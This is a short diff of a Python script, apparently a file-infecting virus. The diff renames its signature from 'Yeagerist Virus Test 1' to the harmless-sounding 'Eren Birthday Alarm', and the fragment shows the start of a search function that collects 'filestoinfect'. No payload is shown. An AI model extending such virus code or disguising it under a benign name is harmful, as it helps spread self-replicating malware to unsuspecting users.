@@ -1,7 +1,7 @@
 #!/usr/bin/python
 import os
 import datetime
-SIGNATURE = "Yeagerist Virus Test 1"
+SIGNATURE = "Eren Birthday Alarm"
 def search(path):
     filestoinfect = []
     filelist = os.listdir(path)
